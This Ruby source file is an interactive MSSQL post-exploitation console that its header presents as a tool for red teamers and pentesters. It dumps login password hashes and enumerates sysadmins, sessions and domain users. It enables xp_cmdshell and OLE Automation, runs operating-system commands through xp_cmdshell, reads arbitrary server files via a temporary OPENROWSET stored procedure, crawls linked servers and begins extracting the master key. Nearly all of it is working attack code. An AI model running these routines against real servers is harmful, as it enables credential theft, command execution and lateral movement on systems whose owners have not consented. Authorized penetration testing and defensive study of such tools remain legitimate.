#!/usr/bin/env ruby
# 
# @author: Sabri (@KINGSABRI)
# @about: a console base tool to connect to MSSQL server for red teamer and pentesters
# 
# gem install sequel terminal-table pry
# 
require 'sequel'
require 'tiny_tds'
require 'readline'
require 'terminal-table'
require 'optparse'
require 'pry'


class String
  def red; colorize(self, "\e[31m"); end
  def green; colorize(self, "\e[32m"); end
  def yellow; colorize(self, "\e[1m\e[33m"); end
  def bold; colorize(self, "\e[1m"); end
  def cyan; colorize(self, "\e[1;36m"); end
  def dark_cyan; colorize(self, "\e[36m"); end
  def colorize(text, color_code)  "#{color_code}#{text}\e[0m" end
  def wrap(val=70)
    self.gsub(/(\S{#{val}})(?=\S)/, '\1 ').gsub(/(.{1,#{val}})(?:\s+|$)/, "\\1\n")
  end
end


class Commands

  attr_accessor :verbose

  def initialize(db)
    @db = db
    @verbose = 'false'
    @debug   = 'false'
  end
  
  def cmd_query(query, print_table=true)
    puts "[>] #{query}" if @verbose =~ /true/i
    records = @db[%Q[#{query}]].all 
    table = Terminal::Table.new do |t|
      records.each do |record|
        t.headings = record.keys
        t << record.values.map {|r| r.nil?? next : r.to_s.wrap(50)}.flatten 
      end
    end
    puts table if (print_table && !records.empty?)
    puts "[♦] ".cyan + "No records found." if (records.empty? && print_table)
    pp query   if @debug =~ /true/i
    pp records if @debug =~ /true/i
    records
  rescue Sequel::DatabaseError => e 
    puts "[!] ".yellow + e.message 
  rescue Exception => e
    puts "[!] ".yellow + "Unhandled exception"
    puts e.full_message
  end

  def cmd_query_link(var=nil)
    link = query = ""
    link  = Readline.readline("[+] ".cyan + "link hostname -> " ) until !link.empty?
    query = Readline.readline("[+] ".cyan + "query to send -> " ) until !query.empty?
    cmd_query("SELECT * FROM OPENQUERY([#{link}], '#{query}')")
  end

  def cmd_whoami(var=nil)
    puts "[+] ".green.bold + "Current user"
    puts cmd_query("SELECT SYSTEM_USER as 'current_user'", false).first[:current_user]
    user_rule = cmd_query("SELECT is_srvrolemember('sysadmin') as user_rule", false).first
    if user_rule[:user_rule] == 1
      puts "[+] ".green.bold + "is admin? " + "Yes!".green
    else
      puts "[+] ".green.bold + "is admin? " + "No"
    end
  end

  def cmd_test(var=nil)
    query = %Q[
select  princ.name
,       princ.type_desc
,       perm.permission_name
,       perm.state_desc
,       perm.class_desc
,       object_name(perm.major_id)
from    sys.database_principals princ
left join
        sys.database_permissions perm
on      perm.grantee_principal_id = princ.principal_id
    ]

    cmd_query query
  end

  def cmd_info(var='')
    puts "[+] ".green.bold + "Server Name"
    cmd_query('SELECT @@servername as "Server Name"')
    puts "[+] ".green.bold + "Server Version"
    cmd_query("SELECT (REPLACE(REPLACE(REPLACE(ltrim((SELECT REPLACE((Left(@@Version,CHARINDEX('-',@@version)-1)),'Microsoft','')+ rtrim(CONVERT(char(30), SERVERPROPERTY('Edition'))) +' '+ RTRIM(CONVERT(char(20), SERVERPROPERTY('ProductLevel')))+CHAR(10))), CHAR(10), ''), CHAR(13), ''), CHAR(9), '')) as 'db version', RIGHT(@@version, LEN(@@version)- 3 -charindex (' ON ',@@VERSION)) as 'os version'")
    puts "[+] ".green.bold + "Service details"
    cmd_query('SELECT servicename,service_account,startup_type_desc,filename FROM sys.dm_server_services')
    puts "[+] ".green.bold + "xp_cmdshell config:"
    cmd_query('SELECT name,value,value_in_use,description,is_dynamic,is_advanced FROM sys.configurations WHERE name = "xp_cmdshell" OR name = "show advanced options";')
    puts "[♠] ".cyan + "you can use 'enable-xpshell' and 'disable-xpcmdshell' to change the values.".dark_cyan
    puts "[+] ".green.bold + "Current user"
    cmd_query("SELECT SYSTEM_USER as 'Current User'")
    puts "[+] ".green.bold + "Domain"
    cmd_query("SELECT DEFAULT_DOMAIN() as domain;")
    puts 
  end


  def cmd_links(var=nil)
    links = cmd_query("SELECT srvname FROM master..sysservers WHERE srvname!=@@servername AND srvproduct = 'SQL Server'")
    if !links.empty?
      links.map do |link|
        linked = cmd_query("SELECT * FROM OPENQUERY([#{link[:srvname]}], 'SELECT srvname FROM master..sysservers WHERE srvname!=@@servername')")
      end
    else
      # no links found
    end
  end

  def cmd_logons(var=nil)
    puts "[+] ".green.bold + "List of loggedin users"
    # cmd_query("SELECT principal_id AS id,name FROM sys.server_principals")
    cmd_query("SELECT sp.name AS login, sp.type_desc AS login_type, CONVERT([varchar](512), sl.password_hash, 1) AS password_hash, CASE WHEN sp.is_disabled = 1 then 'Disabled' else 'Enabled' end AS status FROM sys.server_principals sp left JOIN sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') ORDER BY sp.name;")
  end

  def cmd_db_admins(var=nil)
    puts "[+] ".green.bold + "List of system admins"
    cmd_query("select mp.name as login, case when mp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status, mp.type_desc as type from sys.server_role_members srp join sys.server_principals mp on mp.principal_id = srp.member_principal_id join sys.server_principals rp on rp.principal_id = srp.role_principal_id where rp.name = 'sysadmin' order by mp.name;")
  end

  # https://blog.netspi.com/hacking-sql-server-procedures-part-4-enumerating-domain-accounts/
  def cmd_enum_users(to=10)
    to = 10 if to.nil? || to.empty?
    puts "[+] ".green.bold + "Enumerate users by ID (from '0' up to '#{to}')"
    cmd_query("DECLARE @cnt INT = 0; WHILE @cnt < 10 BEGIN SELECT COALESCE(SUSER_NAME(@cnt), '---') AS username; SET @cnt = @cnt + 1; END;")
  end

  def cmd_enum_domain_groups(domain=nil)
    if domain.nil? or domain.empty?
      domain = cmd_query("SELECT DEFAULT_DOMAIN() AS domain", false).first[:domain].to_s
      puts "[!] ".yellow + "No domain is specified (default current domain '#{domain}')"
    end
    puts "[+] ".green.bold + "Enumerate domain groups"
    cmd_query("EXEC xp_enumgroups #{domain};")
  end

  def cmd_enum_domain_users(domain=nil)
    if domain.nil? or domain.empty?
      domain = cmd_query("SELECT DEFAULT_DOMAIN() AS domain", false).first[:domain].to_s
      puts "[!] ".yellow + "No domain is specified (default current domain '#{domain}')"
    end
    puts "[+] ".green.bold + "Enumerate domain groups"
    groups = cmd_query("EXEC xp_enumgroups #{domain};", false)
    groups.each do |group|
      group = group[:group]
      suser_sid = cmd_query("SELECT SUSER_SID('#{domain}\\#{group}')")
      puts "[+] ".green + "Members of '#{group}' group".bold
      cmd_query("EXEC xp_logininfo '#{domain}\\#{group}', 'members';")
    end
  end

  def cmd_enable_xpcmdshell(var=nil)
    puts "[+] ".green + "Current configurations:"
    cmd_query("SELECT name,value,value_in_use,description,is_dynamic,is_advanced FROM sys.configurations WHERE name = 'xp_cmdshell' OR name = 'show advanced options';")
    puts "[+] ".green + "Enabling xp_cmdshell"
    cmd_query("EXEC('sp_configure ''show advanced options'', 1; reconfigure;');EXEC('sp_configure ''xp_cmdshell'', 1; reconfigure;')")
    puts "[+] ".green + "Modified configurations:"
    cmd_query('SELECT name,value,value_in_use,description,is_dynamic,is_advanced FROM sys.configurations WHERE name = "xp_cmdshell" OR name = "show advanced options";')
  end

  def cmd_disable_xpcmdshell(var=nil)
    puts "[+] ".green + "Current configurations:"
    cmd_query("SELECT name,value,value_in_use,description,is_dynamic,is_advanced FROM sys.configurations WHERE name = 'xp_cmdshell' OR name = 'show advanced options';")
    puts "[+] ".green + "Enabling xp_cmdshell"
    cmd_query("EXEC('sp_configure ''xp_cmdshell'', 0; reconfigure;');EXEC('sp_configure ''show advanced options'', 0; reconfigure;')")
    puts "[+] ".green + "Modified configurations:"
    cmd_query("SELECT name,value,value_in_use,description,is_dynamic,is_advanced FROM sys.configurations WHERE name = 'xp_cmdshell' OR name = 'show advanced options';")
  end

  def enable_ole_authomation
    _print = @verbose =~ /true/i? true : false
    puts "[+] ".green + "Current configurations:" if _print
    cmd_query("SELECT name,value,value_in_use,description,is_dynamic,is_advanced FROM sys.configurations WHERE name = 'Ole Automation Procedures'") if _print
    puts "[+] ".green + "Enabling Ole Automation Procedures"
    cmd_query("EXEC('sp_configure ''show advanced options'', 1; reconfigure;');EXEC('sp_configure ''Ole Automation Procedures'', 1; reconfigure;')", _print)
    puts "[+] ".green + "Modified configurations:" if _print
    cmd_query("SELECT name,value,value_in_use,description,is_dynamic,is_advanced FROM sys.configurations WHERE name = 'Ole Automation Procedures'") if _print
  end


  def cmd_dbs(var=nil)
    puts "[+] ".green + "List of databases:"
    cmd_query('SELECT database_id AS id, name AS db_name FROM sys.databases d')
  end

  def cmd_tables(db=nil)
    if db.nil? or db.empty?
      db = 'master'
      puts "[!] ".yellow + "No database is specified (default '#{db}' database)"
    end
    puts "[+] ".green + "List of tabales for '#{db}' database:"
    cmd_query("SELECT * FROM #{db}.INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE='BASE TABLE'")  
  end

  def cmd_columns(table=nil)
    unless table.nil? or table.empty?
      puts "[!] ".yellow + "No table is specified (default all tables)"
      t_query = "WHERE TABLE_NAME=N'#{table}'"
    end
    puts "[+] ".green + "List of columns for '#{table}' table:"
    cmd_query("SELECT table_catalog AS [Database],table_name AS table_name, column_name AS column_name FROM INFORMATION_SCHEMA.COLUMNS #{t_query}")
  end

  def cmd_sessions(val=nil)
    puts "[+] ".green + "List of sessions:"
    cmd_query("SELECT conn.session_id, host_name, status, program_name, nt_domain, login_name, connect_time, last_request_end_time FROM sys.dm_exec_sessions AS sess JOIN sys.dm_exec_connections AS conn ON sess.session_id = conn.session_id;")
  end

  # 
  # Resources
  # - https://www.mssqltips.com/sqlservertip/1643/using-openrowset-to-read-large-files-into-sql-server/
  # 
  def cmd_cat(file_path)
    if file_path.nil? || file_path.empty?
      puts "[!] ".yellow + "File name missing (full path required)"
      return 
    end    
    file = parse_path(file_path)

    stored = create_readfile_procedure
    query = <<~SQLQUERY
      DECLARE @t VARCHAR(MAX) 
      EXEC #{stored[:procedure]} '#{file[:full_path]}', @t output 
      SELECT @t AS [BulkColumn] 
    SQLQUERY
    puts "[+] ".green.bold + "Reading file '#{file_path}' content:"
    bulkcontent = cmd_query(query, false).first[:bulkcolumn]
    puts "[+] ".green + "Cleaning-up created stored procedure '#{stored[:procedure]}' content"
    cmd_query("DROP PROCEDURE IF EXISTS #{stored[:procedure]}", false) # check if dropped: query IF OBJECT_ID('PROCEDURENAME', 'P') IS NULL SELECT @@servername
    puts bulkcontent.to_s
  end

  def cmd_exec(cmd)
    if cmd.nil? || cmd.empty?
      puts "[!] ".yellow + "No command was provided"
      return 
    end
    cmd_query("EXEC xp_cmdshell '#{cmd}'")
  end

  # TBD : https://github.com/NetSPI/Powershell-Modules/blob/master/Get-MSSQLAllCredentials.psm1
  def cmd_get_allcredentials(val=nil)
    master_key = cmd_query("SELECT substring(crypt_property, 9, len(crypt_property) - 8) FROM sys.key_encryptions WHERE key_id=102 AND (thumbprint=0x03 or thumbprint=0x0300000001)")
  end

  def cmd_verbose(val)
    if val.nil? || val.empty?
      puts "[!] ".yellow + "accepted values 'true' or 'false'"
      puts @verbose
      return 
    end
    val =~ /true/i? (@verbose = 'true') : (@verbose = 'false')
    puts "[*] Setting verbosity to: #{@verbose}"
  end

  def cmd_debug(val)
    if val.nil? || val.empty?
      puts "[!] ".yellow + "accepted values 'true' or 'false'" 
      puts @debug
      return 
    end
    val =~ /true/i? (@debug = 'true') : (@debug = 'false')
    puts "[*] " + "Setting debugging to: #{@debug}"
  end

  def cmd_exit(cmd=nil)
    puts "See you l8er ;)".bold
    exit!
  end

  def cmd_help(var=nil)
    puts "\n"
    puts "Command".ljust(20," ") + "Description"
    puts ("-"*"Command".size).ljust(20," ") + "-" * "Description".size
    puts "query".ljust(20," ")                + "query <QUERY> - send raw query to the database."
    puts "query-link".ljust(20," ")           + "query-link <LINK> <QUERY> - send raw query to the database."
    puts "info".ljust(20," ")                 + "info - retrieve server information."
    puts "whoami".ljust(20," ")               + "whoami - retrieve current user informaiton."
    puts "db-admins".ljust(20," ")            + "db-admins - retrieve sysadmins."
    puts "logons".ljust(20," ")               + "logons - retrieve logged-on users."
    puts "sessions".ljust(20," ")             + "sessions - retrieve sessions (includes usernames and hostnames)."
    puts "enum-domain-groups".ljust(20," ")   + "enum-domain-groups [DOMAIN]- retrieve domain groups."
    puts "dbs".ljust(20," ")                  + "dbs - list databases."
    puts "tables".ljust(20," ")               + "tables <DB_Name> - list tables for database."
    puts "columns".ljust(20," ")              + "columns <Table_Name> - list columns from table."
    puts "exec".ljust(20," ")                 + "exec <CMD> - Execute Windows commands using xp_cmdshell."
    puts "cat".ljust(20," ")                  + "cat <FILE> - Read file from disk. (full path must given)"
    puts "enable-xpcmdshell".ljust(20," ")    + "enable-xpcmdshell - enable xp_cmdshell on MSSQL."
    puts "disable-xpcmdshell".ljust(20," ")   + "disable-xpcmdshell - disable xp_cmdshell on MSSQL."
    puts "links".ljust(20," ")                + "links - crawl MSSQL links."
    puts "verbose".ljust(20," ")              + "verbose [true | false] - show queries behind built-in commands."
    puts "debug".ljust(20," ")                + "debug [true | false] - show queries values behind executed queries."
    puts "help".ljust(20," ")                 + "Show this screen"
    puts "exit".ljust(20," ")                 + "exit the console"
    puts "\n"
  end

  
  def create_readfile_procedure
    stored_proc = "ns_txt_file_read"
    stored_proc = "read_txt_sp_#{('a1'..'z9').to_a.sample(5).join}"
    puts "[*] ".green + "Creating stored procedure '#{stored_proc}'."
    query = <<~RAWSQL
    CREATE PROC [dbo].[#{stored_proc}]  
      @os_file_name NVARCHAR(256) 
      ,@text_file VARCHAR(MAX) OUTPUT  
    AS  
    DECLARE @sql NVARCHAR(MAX) 
            , @parmsdeclare NVARCHAR(4000)

    SET NOCOUNT ON
    SET @sql = 'select @text_file=(select * from openrowset ( 
                bulk ''' + @os_file_name + ''' 
                ,SINGLE_CLOB) x 
                )' 
    SET @parmsdeclare = '@text_file varchar(max) OUTPUT' 
    EXEC sp_executesql @stmt = @sql 
                              , @params = @parmsdeclare 
                              , @text_file = @text_file OUTPUT 
    RAWSQL
    query = cmd_query(query, false)
    {procedure: stored_proc, sp_query: query}
  end

  def parse_path(path)
    if path.nil?
      puts "[!] ".yellow + "Path can't be empty"
      return 
    end
    path_ary = path.split(/[\\]/)
    name = path_ary[-1]
    path = path_ary[0...-1].join('\\')
    full = path_ary.join('\\')
    {path: path, name: name, full_path: full}
  end

  # debugging for developement only
  def cmd_pry(val=nil)
    # Pry.config.prompt_name = "SQL(pry)> "
    # binding.pry
    Pry.start(
      binding,
      :prompt => Pry::Prompt.new(
        "custom",
        "my custom prompt",
        [ proc { "SQL(pry)> " }, proc { "MORE INPUT REQUIRED!*" }]
      )
    )
  end

  def run_command(cmd="")
    run  = cmd.split[0].gsub('-', '_')
    args = cmd.split[1..-1]
    
    if self.respond_to?("cmd_#{run}")
      send("cmd_#{run}", args.join(" "))
    elsif cmd.empty? or cmd.nil?
      # Do Nothing!
    else
      cmd_send(cmd.join(" "))
    end
  rescue NoMethodError => e
    puts "[!] ".yellow + "Unknow command '#{cmd.split.join(' ')}'"
  rescue Exception => e
    puts "[x] ".red + "Unhandled exception!"
    puts e.full_message
  end
end


begin
  opts = {port: '1433'}
  optparse = OptionParser.new do |o|
    o.banner = "Usage: sql.rb [options]"
    o.on("-H", "--host <HOST>", "MSSQL server hostname or IP address.") {|v| opts[:host] = v}
    o.on("-P", "--port [PORT]", "MSSQL port (default: 1433).") {|v| opts[:port] = v }
    o.on("-D", "--database [PASSWORD]", "Database name (optional).") {|v| opts[:database] = v}
    o.on("-u", "--user <[DOMAIN\\\\\]USER>", "MSSQL username (double backslash for domain user: DOMAIN\\\\USER).") {|v| opts[:user] = v}
    o.on("-p", "--pass <PASSWORD>", "MSSQL password.") {|v| opts[:pass] = v.to_s}
    o.on("-h", "--help", "Print this message.") { |v| puts optparse}
  end

  optparse.parse! ARGV

  if (opts[:host].nil? || opts[:user].nil?) 
    puts "[x] ".red.bold + "Missing required arguments!"
    puts optparse
    exit! 
  end

  # SET_MSSQL_DEFAULTS = -> (db) {
  #   db.execute <<-SQL
  #     SET ANSI_NULL_DFLT_ON ON
  #     SET ANSI_NULLS ON
  #     SET ANSI_PADDING ON
  #     SET ANSI_WARNINGS ON
  #     SET CONCAT_NULL_YIELDS_NULL ON
  #     SET QUOTED_IDENTIFIER ON
  #   SQL
  # }

  # To confirm ANSI setting, execute the following query
  # SELECT SESSIONPROPERTY('ANSI_NULLS') AS [AnsiNulls], SESSIONPROPERTY('ANSI_WARNINGS') AS [AnsiWarnings],SESSIONPROPERTY('ANSI_NULL_DFLT_ON') AS [DFLT],SESSIONPROPERTY('ANSI_PADDING') AS [PADDING],SESSIONPROPERTY('CONCAT_NULL_YIELDS_NULL') AS [YIELD],SESSIONPROPERTY('QUOTED_IDENTIFIER') AS [QUOTED]
  db_conn = {
    adapter:       'tinytds',
    host:          opts[:host],
    port:          opts[:port],
    database:      opts[:database],
    user:          opts[:user],
    password:      opts[:pass],
    ansi:          true,  # enable ANSI_NULLS and ANSI_WARNINGS to avoid error
    # after_connect: SET_MSSQL_DEFAULTS,
    log_connection_info: true
  }

  DB = Sequel.connect(db_conn)
  @commands = Commands.new(DB)
  puts "[+] ".green + "Connected to '#{db_conn[:host]}:#{db_conn[:port]}'."
  puts @commands.run_command('help')

  MAIN = %w[
    help info dbs tables columns query links query-link exec cat
    get-xpcmdshell, enable-xpcmdshell disable-xpcmdshell whoami
    logons sessions db-admins enum-users enum-domain-groups
    verbose debug 
    exit
  ].sort
  comp = proc { |s| MAIN.grep(/^#{Regexp.escape(s)}/) }
  Readline.completion_proc = comp

  trap('INT', 'SIG_IGN')
  while true
    command =  Readline.readline('SQL -> '.bold, true)
    @commands.run_command(command)
  end

rescue Sequel::DatabaseConnectionError => e
  puts "[x] ".red + "Could not connect to '#{db_conn[:host]}:#{db_conn[:port]}'."
  puts e.message
rescue Exception => e 
  puts "[x] ".red + e.full_message.to_s
end

